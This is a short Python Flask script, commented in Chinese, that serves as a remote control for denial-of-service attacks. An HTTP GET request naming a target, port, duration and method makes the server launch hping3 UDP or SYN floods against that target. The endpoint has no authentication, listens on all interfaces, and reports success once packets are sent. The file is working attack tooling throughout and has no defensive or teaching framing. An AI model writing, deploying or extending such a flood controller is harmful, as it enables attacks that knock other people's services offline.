from flask import Flask, request, jsonify
import subprocess
import logging

# 配置日志
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def attack():
    target = request.args.get('target')
    port = request.args.get('port')
    time = request.args.get('time')
    method = request.args.get('method')

    logger.info(f"Received attack request - Target: {target}, Port: {port}, Time: {time}, Method: {method}")

    if not all([target, port, time, method]):
        logger.error("Missing parameters")
        return jsonify({"status": "error", "msg": "Missing parameters"}), 400

    try:
        time = int(time)
        port = int(port)
    except ValueError:
        logger.error(f"Invalid time or port value - Time: {time}, Port: {port}")
        return jsonify({"status": "error", "msg": "Invalid time or port value"}), 400

    if time <= 0 or port <= 0:
        logger.error(f"Invalid time or port - Time: {time}, Port: {port}")
        return jsonify({"status": "error", "msg": "Time and port must be positive numbers"}), 400

    if method.lower() == "udp":
        cmd = [
            "hping3",
            "--udp",
            "-p", str(port),
            target,
            "-i", "u1000",
            "-c", str(time * 1000)
        ]
    elif method.lower() == "syn":
        cmd = [
            "hping3",
            "-S",
            "--flood",
            "-p", str(port),
            target
        ]
    else:
        logger.error(f"Unsupported method: {method}")
        return jsonify({"status": "error", "msg": "Unsupported method"}), 400

    logger.info(f"Executing command: {' '.join(cmd)}")

    try:
        # 使用 PIPE 来捕获输出，兼容旧版本 Python
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        try:
            stdout, stderr = process.communicate(timeout=time + 10)
            logger.info(f"Command completed with return code: {process.returncode}")
            logger.debug(f"Command stdout: {stdout}")
            logger.debug(f"Command stderr: {stderr}")
            
            # 对于 UDP 和 SYN flood 攻击，即使返回码不为 0 也认为是成功的
            if "packets transmitted" in stdout or "packets transmitted" in stderr:
                return jsonify({
                    "status": "success",
                    "output": stdout or stderr
                })
            else:
                error_msg = f"Command failed with error: {stderr}"
                logger.error(error_msg)
                return jsonify({
                    "status": "error",
                    "msg": error_msg
                }), 500

        except subprocess.TimeoutExpired:
            process.kill()
            logger.info("Attack finished (timeout reached)")
            return jsonify({
                "status": "success",
                "output": "Attack finished (timeout reached)."
            })

    except Exception as e:
        error_msg = f"An error occurred: {str(e)}"
        logger.error(error_msg, exc_info=True)
        return jsonify({
            "status": "error",
            "msg": error_msg
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080) 